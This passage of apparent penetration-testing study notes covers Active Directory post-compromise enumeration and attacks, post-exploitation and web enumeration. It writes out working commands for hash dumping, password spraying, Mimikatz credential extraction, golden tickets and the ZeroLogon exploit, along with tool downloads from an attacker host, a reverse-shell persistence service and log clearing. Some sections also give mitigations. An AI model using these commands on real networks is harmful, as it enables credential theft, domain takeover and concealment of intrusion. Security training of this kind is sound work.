</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Active Directory - Post Compromise Enumeration" class="heading" id="Active_Directory_-_Post_Compromise_Enumeration">Active Directory - Post Compromise Enumeration</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>This section revolves around digging <em>information</em> about the <em>Active Directory</em> once we gained <em>access</em> to any host on the network. We will utilize various tools to get a better understanding of the <em>hierarchy of users</em> in the network, the <em>group policies</em>, <em>hosts connected</em> to the network, <em>active sessions</em>, <em>administrative rights</em>, information about the <em>domain controller</em> as well as about various other aspects and <em>configuration settings</em> of the Active Directory. </p>
</li>
<li data-line="2">
<p>The first tool that we are gonna use for system <em>enumeration</em> is <strong><mark>PowerView</mark></strong>. <em>PowerView</em> is basically a <em>powershell</em> script that has to be executed on the <em>compromised host</em> and it collects data about various components of the AD, identifies the users and hosts connected as well as gathers info about the various group policies set in the AD. </p>
<p> Once we have got <em>shell access</em> on the target, we can transfer this script to the compromised host using various methods. Then we have to spawn a <em>Powershell</em> with a <em>Execution Policy</em> set to <em>bypass</em> setting using command <code>powershell -ep bypass</code>. Now we execute the <em>PowerView</em> script using       <code> . .\PowerView.ps1</code> after which we can execute various commands to <em>enumerate</em> the AD like <code>Get-NetDomain</code>, <code>Get-DomainPolicy</code>,<code>Get-NetUsers | select samaccountname</code>, <code>Get-NetGPO</code>, <code>Invoke-ShareFinder</code> etc.</p>
<p> <em>PowerView</em> is very powerful tool which can be used for a variety of post compromise information gathering and even provides <em>persistence</em> capabilities to the attacker.</p>
</li>
<li data-line="8">
<p>Another great tool for post compromise enumeration is <mark><strong>Bloodhound</strong></mark>. <em>BloodHound</em> uses <em>graph theory</em> to reveal the hidden and often unintended <em>relationships</em> within an Active Directory or Azure environment. Attackers can use <em>BloodHound</em> to easily identify highly <em>complex attack paths</em> that would otherwise be impossible to quickly identify. It can be used to easily gain a deeper understanding of <em>privilege relationships</em> in an Active Directory.</p>
<p> Bloodhound works by importing a zip file containing comprehensive data about the AD in JSON format. It then uses that data to visualize complex relationships and attacks paths in the AD with the help of graphs. This helps us in getting a better understanding about the overall architecture and hierarchy of the AD. </p>
<p> The zip file is generated using an ingestor known as SharpHound which is used for data collection and enumeration on the compromised host. SharpHound exists in the format of a powershell script. It can be executed using <code>. .\SharpHound.ps1</code> command. After that we use command <code>Invoke-Bloodhound -CollectionMethod All -Domain Daddy.xyz -ZipFileName son1.zip</code> to spit out the zip file. This file can then be simply imported in Bloodhound to get a visual representation of the entire AD as shown below:<br>
<span alt="graph.png" src="graph.png" class="internal-embed media-embed image-embed is-loaded"><img alt="graph.png" src="graph.png"></span><br>
<mark><strong>Note</strong>: When installing Bloodhound using <code>apt install bloodhound</code> command, an older version of Bloodhound gets installed namely <code>4.3.1</code>. All versions of SharpHound v2.x or above won't work with this version of Bloodhound. So, we have to specifically use SharpHound v1.1.1 or below to generate a supported zip file.</mark></p>
</li>
<li data-line="16">
<p>To summarize this section, we have learnt about various tools which help us get a better understanding about the <em>Active Directory</em>. The mantra to get the best results out of these tools is <em>using</em> them again and again for <em>enumeration</em> as we keep <em>gaining access</em> to new hosts in the network. This helps us in forming a complete picture of the <em>architecture</em> and <em>hierarchy</em> of the Active Directory.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Active Directory - Post Compromise Attacks" class="heading" id="Active_Directory_-_Post_Compromise_Attacks">Active Directory - Post Compromise Attacks</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>In this section we explore various attacks that we can use once we have compromised any user or host in the <em>Active Directory</em>. One such attack is <mark><strong>Pass the Hash</strong></mark>. In this attack, we first dump all the <em>password hashes</em> available on the compromised host. This includes both <em>local SAM hashes</em> as well as <em>cached Domain hashes</em>. We can then crack these hashes using <em>Hashcat</em> to get the plaintext passwords or directly use them for <em>password spraying</em> using <strong>crackmapexec</strong> or <strong>netexec</strong>. </p>
<p> There are multiple ways of dumping hashes. We could use the <strong>secretsdump.py</strong> which is included in <em>Impacket</em> suite using the command <code>secretsdump.py Daddy/Son1:MYpassword123#@192.168.75.132</code>. This will dump all the <em>local</em> and <em>domain</em> hashes stored on the compromised host. We can then use these hashes for <em>password spraying</em> and <em>authenticating</em> to other hosts which may support these user accounts.</p>
<p> We can then execute the <em>password spraying</em> attack using <strong>crackmapexec</strong>. Since, this program is no longer maintained we will use a newer program called <strong>netexec</strong> which is based off <em>crackmapexec</em>. We can execute it using command <code>netexec smb 192.168.75.0/24 -d Daddy.xyz -u "Son1" -p "MYpassword123#"</code>. </p>
<p> This will let us know about all the hosts that can be authenticated using these <em>compromised credentials</em>. We can also dump the password hashes stored on these compromised hosts using <code>netexec smb 192.168.75.0/24 -d Daddy.xyz -u "Son1" -p "MYpassword123#" --sam</code>. This is how by using <mark>Pass the Hash</mark> attacks we can dump hashes and use them gain access to other hosts in the Active Directory.</p>
</li>
<li data-line="8">
<p>Now to get a <em>shell</em> on the compromised host we generally use <strong>psexec.py</strong> tool. This tool can either be used with a <em>password</em> or a <em>password hash</em>. Now the problem is that only <strong>NTLM</strong> hashes can be used for password spraying. <em>Local Accounts</em> hashes are generally stored in <em>NTLM</em> format whereas <em>Domain Account</em> ones are stored as <em>NTLMv2</em> or <em>DCC2</em>. So, we can't use Domain hashes for password spraying. But many times the passwords for local and domain accounts are same. In that case we could use the <em>NTLM</em> hash of local account to authenticate as a Domain Account User.</p>
</li>
<li data-line="10">
<p>Even though <em>Pass the Hash</em> attacks cannot be entirely prevented, we can at least make it very hard for the attacker to use these attacks by ensuring following practices and policies:<br>
<strong>(i)</strong> <mark>Limit Account Reuse</mark>: Avoid reusing local passwords for Domain accounts and disable guest and local administrator accounts. By limiting the users in the local Admin group we can increase our resilience against such attacks.<br>
<strong>(ii)</strong> <mark>Utilize strong passwords</mark>: Don't use easily guessable passwords with common words. Use special characters and numbers along with alphabets. Also the longer the password the better.<br>
<strong>(iii)</strong> <mark>Privilege Access Management</mark>: Regularly inspect sensitive accounts to detect breaches. Automatically rotate passwords at regular intervals as this limits the time period for Pass the Hash attacks.</p>
</li>
<li data-line="15"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>Another great attack is <mark><strong>Token Impersonation</strong></mark>. Its a wonderful <em>privilege escalation</em> attack which enables us to <em>impersonate</em> any user which has logged onto to that machine after <em>last reboot</em>. Tokens in general are <em>temporary keys</em> that allow us to access a system or a network without having the need to provide <em>credentials</em> every time we access a file. They persist until a reboot. They similar to <em>cookies</em> in our web browser.</p>
<p>  Tokens in general can be of two types:</p>
<ul>
<li data-line="18">
<p><strong>Delegate Tokens</strong>: Delegate tokens are created for ‘<em>interactive</em>’ logons, such as logging into the machine or connecting to it via Remote Desktop.</p>
</li>
<li data-line="19">
<p><strong>Impersonate Tokens</strong>: Impersonate tokens are for ‘<em>non-interactive</em>’ sessions, such as attaching a network drive or a domain logon script.</p>
<p>We can use the <strong>Incognito</strong> module in <em>Metasploit</em> for Token Impersonation attacks. First we try to gain access to a compromised host using various exploits like <code>windows/smb/psexec</code>. Then we load the <em>incognito</em> module using <code>load incognito</code> command. Now, we can list all the <em>valid tokens</em> in scope of the current user using <code>list_tokens -u</code>. We can then impersonate any useful token using <code>impersonate_token Daddy\\Administrator</code>.</p>
</li>
</ul>
<p> Now, we can execute commands with <em>Domain Administrator</em> privileges. Whenever we want to revert back to our original token, we can do so using <code>rev2self</code> command. This technique enables us to impersonate <em>powerful user</em> accounts that logged in to our host, even without knowing their credentials.</p>
</li>
<li data-line="25">
<p>There are a few mitigation strategies for Token Impersonation attacks.<br>
<strong>(i)</strong> We can limit <em>user/group</em> token creation permissions even though implementing this can be a little tricky.<br>
<strong>(ii)</strong> Another great practice would be <em>account tiering</em>. Creating specific accounts for different tasks and restricting the use of Admin accounts.<br>
<strong>(iii)</strong> The <em>Domain Admins</em> should be restricted to only the <em>Domain Controller</em> itself. This reduces the attack surface for attacking Admin accounts.</p>
</li>
<li data-line="30">
<p>A quite popular attack is <mark><strong>Kerberoasting</strong></mark>. This attack exploits the general Kerberos functionality in order to obtain a password hash of an Active Directory account that has a <strong>Service Principal Name</strong> (“SPN”). In such an attack, an <em>authenticated</em> domain user requests a <em>Kerberos ticket</em> for an SPN. The retrieved Kerberos ticket&nbsp;is <em>encrypted</em> with the hash of the&nbsp;service account password affiliated with the SPN. <code>(An SPN is an attribute that ties a service to a user account within the AD)</code>. The adversary then works offline to crack the password hash using <em>brute force</em> techniques.</p>
<p> <strong>Kerberoasting</strong> attacks also exploit an architecture flaw, in that any authenticated domain user can initiate a <em>TGS</em> request for any service on the network. The <em>domain controller</em> that is the recipient of the request typically does not check to see if the user is authorized to access this service. The service itself enforces access rights, which creates a loophole by which an offline attack can occur.</p>
<p> <span alt="1 PM2OR8Xf9eDm8Mw04Ryu1A.webp" src="1 PM2OR8Xf9eDm8Mw04Ryu1A.webp" class="internal-embed media-embed image-embed is-loaded"><img alt="1 PM2OR8Xf9eDm8Mw04Ryu1A.webp" src="1-pm2or8xf9edm8mw04ryu1a.webp"></span></p>
</li>
<li data-line="35">
<p>It very simple to execute this attack. For this we use a tool called <strong>GetUserSPNs.py</strong> included with the <em>Impacket</em> Suite. This tool can be used to request for a <em>TGS</em> from the Domain Controller for any <em>SPNs</em> in the Active Directory using command <code>GetUserSPNs.py Daddy.xyz/son1:MYpassword123#  -dc-ip 192.168.75.155 -request</code>. </p>
<p> After we have received the <em>TGS</em> which is encrypted using the <em>password hash</em> of <em>SPN's</em> account, we try to crack that hash using tools like <em>Hashcat</em>. This reveals the <em>plaintext password</em> for the SPN service account which can use to <em>impersonate</em> the account owner and inherit access to any systems, assets or networks granted to the compromised account.\</p>
</li>
<li data-line="39">
<p>Since, these attacks don't involve any <em>malware</em> and are basically exploiting a feature of the Active Directory itself, they are very hard to <em>detect</em> and <em>mitigate</em>. One practice that can be adopted to build <em>resilience</em> against such attacks is using <em>strong</em> and <em>long</em> passwords by default. Also, these passwords should changed regularly. On top of that we must ensure that any of these <em>SPN</em> service accounts are designed with the concept of <em>Least Privileges</em> in mind and not granted any unnecessary rights.</p>
</li>
<li data-line="41">
<p>Another cool exploit is <mark><strong>Group Policy Preferences(GPP) Credentials</strong></mark> attack. It is a very common and easy attack that provides <em>user credentials</em> stored in <strong>SYSVOL</strong> share that can be used to get a shell or escalate privileges. <em>Group Policy Preferences</em> is a collection of Group Policy client-side extensions that allow Administrators to create Domain Policies with <em>embedded credentials</em>. </p>
<p> These credentials are stored in a <em>XML</em> file (<code>Policies.xml</code> or <code>Groups.xml</code>) in <em>SYSVOL</em> directory and are encrypted using <em>AES</em>. The AES key used to encrypt these was accidently leaked by Microsoft and so now anyone with the embedded <em>cPassword</em> can decrypt it to get the <em>plaintext</em> password. This attack can then be combined with <em>Kerberoasting</em> for privilege escalation. The encrypted GPP password can be cracked using <code>gpp-decrypt &lt;hash&gt;</code>.</p>
<p> This attack is not very common these days as it was patched by <em>Microsoft</em> in <em>2014</em> after <strong>MS14-025</strong> patch. But if we find any servers from <em>2012</em> or even <em>ADs</em> that haven't <em>updated</em> their GPP credentials after the patch, we could still use this exploit. </p>
</li>
<li data-line="47">
<p><mark><strong>Mimikatz</strong></mark> is one of the best tools to gather <em>credential</em> data from Windows systems. It is a fantastic tool for extracting <em>plaintexts</em> passwords, <em>hash</em>, <em>PIN code</em> and <em>Kerberos</em> tickets from memory on the compromised host. It also can also perform <em>pass-the-hash</em>, <em>pass-the-ticket</em> and even build <em>Golden tickets</em>. </p>
<p>   The first thing we have to do after firing up the <code>mimikatz.exe</code> is running <code>privilege::debug</code> command. This enables us to <em>debug</em> processes and <em>bypass</em> memory protections like <strong>LSASS</strong> so that we extract sensitive data from the memory. Now, we can dump all the <em>logon</em> password hashes using <code>sekurlsa::logonpasswords</code>. This reveals a lot of sensitive information about the machine and all the users that logged in on it since last reboot.</p>
<p>   We will often find a section called <strong>wdigest</strong> which was used to store passwords in <em>plaintext</em> format but was disabled after <em>Windows 8</em>. This feature can be enabled through <em>mimikatz</em> and used to capture plaintext passwords for every new login. We can also use <code>lsadump::sam</code> or <code>lsadump::sam /patch</code> to dump password hashes. </p>
<p>   Another very important command is <code>lsadump::lsa</code> or <code>lsadump::lsa /patch</code>. The <strong>LSA</strong>, which includes the <em>Local Security Authority Server Service</em>      (<em>LSASS</em>) process, validates users for <em>local</em> and <em>remote</em> sign-ins and enforces local <em>security policies</em>. LSA is provided to prevent reading memory and code injection by nonprotected processes. Dumping LSA credentials can reveal <em>password hashes</em> for a lot of important services like <strong>KRBTGT</strong>.</p>
</li>
<li data-line="55">
<p>To gain absolute authority over the <em>Active Directory</em> and almost unlimited access over the <em>domain</em> we can utilize another powerful attack called the <mark><strong>Golden Ticket</strong></mark> attack. This attack exploits weaknesses in the <strong>Kerberos identity authentication</strong> protocol, which is used to access the AD, allowing an attacker to bypass normal authentication.</p>
<p>  Typically, <em>Kerberos</em> authentication uses a <strong>Key Distribution Center</strong>(KDC) to   protect and verify a user’s identity by granting a ticket to the user for access. With this system, the goal is to eliminate the need for multiple credential requests to the user. This ticket is known as <em>Ticket Granting Ticket(TGT)</em> and is encrypted using <em>KRBTGT</em> password hash. The <em>KRBTGT</em> account is responsible for granting tickets to all users and services in the Domain. If we are somehow able to steal this hash we could generate as many tickets as possible and gain absolute control over <em>Domain</em>. </p>
<p>   The Golden Ticket Attack requires the following key things to work:<br>
<strong>(i)</strong> Fully qualified Domain name. Eg: <code>Daddy.xyz</code><br>
<strong>(ii)</strong> The <em>Security Identifier</em> of the Domain aka the <strong>SUID</strong>.<br>
<strong>(iii)</strong> The <em>KRBTGT</em> password hash.<br>
<strong>(iv)</strong> <em>Username</em> of the account they are going to access.</p>
<p>   Once we have acquired all of the above mentioned information we can generate a <em>Golden Ticket</em> for that account using <em>mimikatz</em>. We use the command <code>kerberos::golden /domain:Daddy.xyz /sid:&lt;SUID of Domain&gt; /krbtgt:&lt;password hash&gt; /user:Administrator /id:500 /ptt</code>. Here, the <code>/ptt</code> argument stands for <em>pass-the-ticket</em> which is used to utilize the <em>Golden Ticket</em> for the <em>current</em> session. By omitting <code>/ptt</code> and appending <code>/target:&lt;target.kirbi&gt;</code> we can <em>output</em> the ticket to a file which can then be imported whenever required based on its expiration date using <code>kerberos::ptt &lt;target.kirbi&gt;</code>. Also, to <em>purge</em> the existing Kerberos <em>ticket cache</em> we can use the command <code>kerberos::purge</code>. </p>
</li>
<li data-line="67">
<p>After importing a ticket in our current session we won't necessarily notice a change in our <em>account status</em>. We would still have the same <em>uid</em> and <em>gid</em> as <strong>whoami</strong> output. The <em>Golden Ticket</em> would actually be stored inside the <em>cache</em> and will be used for authenticating to the target host. We could use <strong>PsExec.exe</strong> for spawning a <em>bind shell</em> on the target host using command <code>PsExec.exe \\BossBaby cmd.exe</code>. Here, <code>BossBaby</code> is the hostname of the target host. If we want to spawn a new shell from within <em>mimikatz</em> we can do so using the command <code>misc::cmd</code>.</p>
</li>
<li data-line="69">
<p>The last attack which we will discuss is <mark><strong>ZeroLogon</strong></mark> attack aka <code>CVE-2020-1472</code> <strong>Unauthenticated Privilege Escalation</strong>. This vulnerability allows an <em>unauthenticated</em> attacker with network access to a domain controller, to establish a vulnerable <em>Netlogon</em> session and eventually gain domain <em>administrator</em> privileges. This means that once an attacker has network access to a domain controller, they can <em>brute-force</em> their way onto the domain controller in about <strong>256</strong> attempts — which takes only <em>2–3</em> seconds. Any account lockout policy that might be in place is irrelevant because it applies only to user accounts.</p>
<p>   This attack has the potential to completely <em>destabilize</em> the Domain Controller and <em>destroy</em> the Active Directory and hence must be used with utmost <em>caution</em>. First, we can check whether our target DC is vulnerable to this exploit using a zerologon_tester.py script from <a data-tooltip-position="top" aria-label="https://github.com/SecuraBV/CVE-2020-1472" rel="noopener" class="external-link" href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank">SecuraBV</a> by using the command <code>python3 zerologon_tester.py BossBaby 192.168.75.160</code>. </p>
<p>   Then if its vulnerable, we could exploit it either using <strong>mimkatz</strong> or manually. We could use the exploit by <a data-tooltip-position="top" aria-label="https://github.com/dirkjanm/CVE-2020-1472" rel="noopener" class="external-link" href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank">dirkjanm</a>. To use the exploit we simply use the command <code>python3 cve-2020-1472-exploit.py BossBaby 192.168.75.160</code>. After executing the exploit the DC password will be set to <em>null</em> and we then steal the <em>KRBTGT</em> hash and generate <em>Golden Tickets</em>.</p>
<p>   We can also reverse the changes done by this exploit. First, we use <code>secretsdump.py -just-dc Daddy/BossBaby\$@192.168.75.160</code> to dump the Administrator's account password hash. We will then use <em>pass-the-hash</em> attack to dump Administrator's accounts secrets using <code>secretsdump.py Administrator@192.168.75.160 -hashes &lt;hashvalue&gt;</code>. This will reveal the the <em>Domain Controller's</em> original plaintext password as a <strong>hex</strong> value. We will the use the <em>restorepassword.py</em> script along with the <strong>hexvalue</strong> to restore the DC accounts password back to its <em>original</em> state using <code>python3 restorepassword.py Daddy/BossBaby@Bossbaby -target-ip 192.168.75.160 -hexpass &lt;hexvalue&gt;</code>. This vulnerability was <em>patched</em> in <strong>2020</strong>, so any DC without this <em>patch update</em> is vulnerable to this exploit.<br>
</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Post Exploitation" class="heading" id="Post_Exploitation">Post Exploitation</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>After we have exploited our target and gained access, we need to <em>escalate</em> our privileges to get <strong>Administrator</strong> or <strong>Root</strong> access. Then we can download our tools on the target machine through various methods for further exploitation.</p>
<p> First we need to host a <em>webserver</em> on our machine which we could use to serve our tools to the target machine. We can do so by using either the included <strong>apache2</strong> webserver in Kali or creating a <strong>Python</strong> webserver using <code>python -m simple.http &lt;port number&gt;</code>. Then we can use this to download tools on the target machine.</p>
<p> If the target is a <em>Windows</em> device, we could either use <code>certutil.exe -urlcache -f http://192.168.75.131:8888/xyz.exe xyz.exe</code> command in the <em>CMD</em> or <code>IWR http://192.168.75.131:8888/xyz.exe -o xyz.exe</code> command in <em>Powershell</em>. On a Linux machine, we could achieve the same using <code>wget http://192.168.75.131:8888/xyz.exe -O xyz.exe</code>. We could also use the <strong>Browser</strong> to download the files from the attacker's machine.</p>
<p> We could also host a <strong>FTP</strong> server to transfer files. <em>FTP</em> server can be hosted using <code>python -m pyftpdlib 21</code> can the files can be accessed on target machine using <code>ftp 192.168.75.131</code>.</p>
</li>
<li data-line="8">
<p>Another important step to consider as soon as we gain access is to maintain <mark><strong>Persistence</strong></mark>. This ensures that we are able to <em>reconnect</em> back to our target even after the current session is <em>terminated</em>. This can be achieved in a variety of ways, the one which we will discuss is using <em>Metasploit</em>. Here, we will discuss a method to achieve persistence on a <em>Windows</em> target host:</p>
<p> Inside <em>Metasploit</em>, we <em>background</em> our current session using the command <code>background</code> and then use the <code>exploit/windows/local/persistence</code> module. We configure the various options like <em>DELAY</em>, <em>EXE_NAME</em> and <em>SESSION</em>. Then we type <code>advanced</code> to list advanced options. Here, we set the <em>EXE::Custom</em> option to point to our custom undetectable <em>reverse shell</em> binary hosted on a web server locally. After we hit <code>exploit</code>, this will install a <em>background service</em> on Windows machine that will try to get us a <em>reverse shell</em> after every <strong>X</strong> delay time specified. This will enable us to achieve <em>persistence</em> even after the computer is rebooted. <mark>Refer to <strong>zSecurity</strong> video for full tutorial.</mark><br>
<span alt="1Screenshot (78).png" src="1Screenshot (78).png" class="internal-embed media-embed image-embed is-loaded"><img alt="1Screenshot (78).png" src="1screenshot-(78).png"></span></p>
</li>
<li data-line="13">
<p>Another thing that can be done after exploiting a host is <mark><strong>Pivoting</strong></mark>. This involves using the target machine to <em>pivot</em> to another network to which we <em>don't have access</em>. The target machine will be used as a <em>intermediary</em> to access that network. Once inside <em>Metasploit</em>, we will try to find, to which networks the target machine has access? We could do this by running <code>route print</code>, <code>ipconfig</code>, <code>arp -a</code> on target machine if its Windows based. </p>
<p>  Once we have identified our target network, we will use <code>run autoroute -s &lt;Network Host IP&gt;</code> in the <em>meterpreter</em>. This will automatically add a <em>route</em> to the target network in our <em>routing table</em>. We could list all such <em>active routes</em> using command <code>run autoroute -p</code>. We can then scan and attack the hosts on that new network which was previously <em>inaccessible</em> to us.</p>
</li>
<li data-line="17">
<p>Another important task to consider once we have <em>exploited</em> our target and achieved our <em>goals</em> is <mark><strong>Cleaning up</strong></mark>. This includes cleaning our <em>footprints</em> on the target machine which includes deleting all our <em>uploaded files</em>, clearing <em>system</em> and <em>event</em> logs, restoring <em>configuration</em> settings and making it look like we were never actually there.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Web Application Enumeration: Revisited" class="heading" id="Web_Application_Enumeration:_Revisited">Web Application Enumeration: Revisited</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>We will come across new <em>tools</em> which will help us <em>enumerate</em> web applications better and broaden our <em>attack surface</em>. This includes finding all <em>subdomains</em>, probing which domains are <em>still active</em>, scanning for <em>open ports</em> and <em>services</em>, pulling down and enumerating <em>wayback</em> data and taking website <em>screenshots</em>.</p>
</li>
<li data-line="2">
<p>First, we will install <strong>Golang</strong> language which is a lightweight, compiled, procedural language for <em>microservices</em> and <em>API</em> development. As a result it is much faster than its competition like <em>Python</em> and hence is often preferred for <em>scripting</em>. We use <mark><strong><a data-tooltip-position="top" aria-label="https://github.com/Dewalt-arch/pimpmykali" rel="noopener" class="external-link" href="https://github.com/Dewalt-arch/pimpmykali" target="_blank">pimpmykali</a></strong></mark> to install <em>Go</em> and other tools. </p>
<p> Now, with <em>Go</em> installed, the first tool which we will use is <strong><mark><a data-tooltip-position="top" aria-label="https://github.com/tomnomnom/assetfinder" rel="noopener" class="external-link" href="https://github.com/tomnomnom/assetfinder" target="_blank">assetfinder</a></mark></strong> which is used for finding <em>subdomains</em>. We will use this tool in our own <em>custom</em> script to format output in <em>desirable</em> format. Another great tool for finding subdomains is <mark><strong><a data-tooltip-position="top" aria-label="https://github.com/owasp-amass/amass" rel="noopener" class="external-link" href="https://github.com/owasp-amass/amass" target="_blank">Amass</a></strong></mark>, which can also be used for more <em>exhaustive</em> enumeration. We can install these tools using <em>Go</em> command syntax <code>go install github.com/tomnomnom/httprobe@latest</code>.</p>
</li>
<li data-line="6">
<p>Next tool which we will use is <mark><strong><a data-tooltip-position="top" aria-label="https://github.com/tomnomnom/httprobe" rel="noopener" class="external-link" href="https://github.com/tomnomnom/httprobe" target="_blank">httprobe</a></strong></mark>. It is great tool for finding out active domains. It can be used to check whether a domain is active or not using command <code>echo cuchd.in | httprobe</code> and for a list of domains using <code>cat domains.txt | httprobe</code>. The output lists out all the active domains in the list which can the then be formatted as required. We could also set the option to probe specific ports only using <code>httprobe -s -p https:8443</code>. </p>
</li>
<li data-line="8">
<p>Another great <em>Go</em> tool for which can be used for <em>screenshotting</em> all the web applications that are tagged alive by <em>httprobe</em> so as to highlight potential areas of interest is using <mark><strong><a data-tooltip-position="top" aria-label="https://github.com/sensepost/gowitness" rel="noopener" class="external-link" href="https://github.com/sensepost/gowitness" target="_blank">gowitness</a></strong></mark>. It is a great <em>automated</em> website screenshot tool which necessarily requires <strong>Google Chrome</strong> installed. It was popping out tons of errors when it was installed in the way as specified by the instructor. So, for it to work properly, install it through <strong>pimpmykali</strong>.</p>
</li>
<li data-line="10">
<p>Similarly, we could use various other tools for <em>enhancing</em> out output, like by <em>combining</em> outputs of different tools like <strong>sublist3r</strong>, <strong>amass</strong> together, looking up their <em>certificates</em> using <strong>certspotter</strong>, checking if the domains can be <em>taken over</em> using <strong>subjack</strong> etc. To summarize, there exist a ton of tools out there to enumerate web applications. We have to write our own <em>custom</em> scripts based on these various tools to output <em>rich</em> and <em>optimized</em> results.</p>
</li>
<li data-line="12">
<p>My own custom <em>modified</em> script is available <a data-tooltip-position="top" aria-label="https://pastebin.com/hQ9LPa1K" rel="noopener" class="external-link" href="https://pastebin.com/hQ9LPa1K" target="_blank">👉Here!👈</a>. Other great channels for learning more about <strong>Web Enumeration</strong> are <strong><mark><a data-tooltip-position="top" aria-label="https://www.youtube.com/watch?v=p4JgIu1mceI" rel="noopener" class="external-link" href="https://www.youtube.com/watch?v=p4JgIu1mceI" target="_blank">NahamSec</a></mark></strong> and <mark><strong><a data-tooltip-position="top" aria-label="https://www.youtube.com/watch?v=uKWu6yhnhbQ" rel="noopener" class="external-link" href="https://www.youtube.com/watch?v=uKWu6yhnhbQ" target="_blank">Red Team Village</a></strong></mark>.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Top 10 Web Application Vulnerabilities" class="heading" id="Top_10_Web_Application_Vulnerabilities">Top 10 Web Application Vulnerabilities</h1><div class="heading-children"><div><p>This section involves a brief introduction to the <mark><strong>Top 10 OWASP Web Application Vulnerabilities</strong></mark>. Its regularly-updated <em>report</em> outlines <em>security concerns</em> for web application security, focusing on the <em>10</em> most critical risks. The report is put together by a team of security experts from all over the world. We will use a vulnerable web application called <em>Juice-Shop</em> which is maintained by <em>OWASP</em> to learn and practice about these vulnerabilities.</p></div><div><ol>
<li data-line="0"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Broken Access Controls</strong><br>
This vulnerability occurs when there is <em>broken access</em> to resources, it means there are some <em>improperly</em> configured <em>missing</em> restrictions on authenticated users which allows them to <em>access</em> unauthorized functionality or data like access to others <em>accounts</em>, <em>confidential documents</em>, etc. For this attack, attackers take the help of <em>session management</em> and try to access data from the <em>unexpired</em> session tokens, which gives them access to many valid IDs and passwords.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="4">Adopt a <em>least privileged</em> approach.</li>
<li data-line="5">Delete accounts that are no longer needed or active.</li>
<li data-line="6">Audit activity on servers and websites.</li>
</ul>
</li>
<li data-line="8"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Cryptographic Failures</strong><br>
Data in transit and at rest — such as <em>passwords</em>, <em>credit card numbers</em>, <em>health records</em>, <em>personal information</em>, and <em>business secrets</em> — require extra protection due to the potential for cryptographic failures (sensitive data exposures). This includes use of <em>outdated</em> or <em>insecure</em> cryptographic algorithms, <em>default</em> crypto keys, weak crypto keys being generated and re-used, crypto keys being exposed in source code repositories and overall poor key management.</p>
<p> <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="12">Encrypt data while it is in transit and at rest.</li>
<li data-line="13">Use the most up-to-date encryption techniques.</li>
<li data-line="14">Use Strong adaptive and salted hashing functions when saving passwords.</li>
</ul>
</li>
<li data-line="16"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Injection</strong><br>
Injection vulnerabilities can occur when a <em>query</em> or <em>command</em> is used to insert untrusted data into the interpreter via <em>SQL</em>, <em>OS</em>, <em>NoSQL</em>, or <em>LDAP</em> injection. The hostile data injected through this attack vector tricks the interpreter to make the application do something it was not designed for, such as generating unintended commands or accessing data without proper <em>authentication</em>.</p>
<p> <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="20">Segregate commands from data to avoid exposure to attacks.</li>
<li data-line="21">Code SQL queries with parameters rather than structuring the command.</li>
<li data-line="22">Eliminate the interpreter altogether through the use of a <em>safe API</em>.</li>
</ul>
</li>
<li data-line="24"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Insecure Design</strong><br>
It focuses on risks related to design flaws. If we genuinely want to "move left" as an industry, we need more threat modeling, secure design patterns and principles, and reference architectures. An insecure design cannot be fixed by a perfect implementation as by definition, needed security controls were never created to defend against specific attacks.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="28">Establish and use a safe development lifecycle with <em>AppSec</em> professionals.</li>
<li data-line="29">Create and use a library of secure design patterns.</li>
<li data-line="30">Use threat modeling for crucial authentication.</li>
</ul>
</li>
<li data-line="32"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Security Misconfiguration</strong><br>
This vulnerability refers to the improper implementation of security intended to keep application data safe. These flaws allow hackers to keep track of the <em>configuration</em> of the security and find new possible ways to enter websites. It may include accepting <em>default settings</em> that are insecure, <em>incomplete</em> configurations, <em>misconfigured</em> HTTP headers etc.</p>
<p>  <mark><strong>Defenses</strong>:</mark></p>
<ul>
<li data-line="36">Use predefined secure templates during development and deployment.</li>
